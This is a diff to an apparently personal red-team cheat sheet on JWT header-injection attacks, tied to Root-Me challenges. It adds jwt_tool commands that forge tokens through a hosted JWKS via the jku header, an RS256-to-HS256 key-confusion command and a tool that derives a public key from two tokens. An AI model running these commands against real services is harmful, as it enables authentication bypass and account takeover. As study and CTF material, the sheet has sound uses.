@@ -86,7 +86,16 @@ $ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
 
 #### JWT Header Injection — JKU
 
+[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
+
 The `jku` header contains a URL or a filename used to fetch a key.
+
+```shell!
+$ cat $HOME/.jwt_tool/jwttool_custom_jwks.json # upload to URL as jwks.json
+$ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
+```
+
+📚 You may check: `/jwks.json`, `/.well-known/jwks.json`, etc. Refer to [SSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md) for insight on URLs <small>(filtering, attacks, etc.)</small> and setting up a [grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md).
 
 #### JWT Header Injection — KID
 
@@ -94,12 +103,18 @@ The `kid` header may be added, such as the `jwk` object, to determine which key 
 
 #### JWT Header Injection — HS256
 
-[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
+[![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
 
 When using RS256 algorithm, JWT uses the private key to sign the JWK and the public key to verify integrity. We may be able to perform a downgrade attack to HS256 and only use a public key for both.
 
 ```ps
 $ jwt_tool 'jwt' -S hs256 -k public.key -T
+```
+
+You can compute the public key if you have two messages:
+
+```ps
+$ docker run -it ttervoort/jws2pubkey "JWT1" "JWT2"
 ```
 </div></div>
 
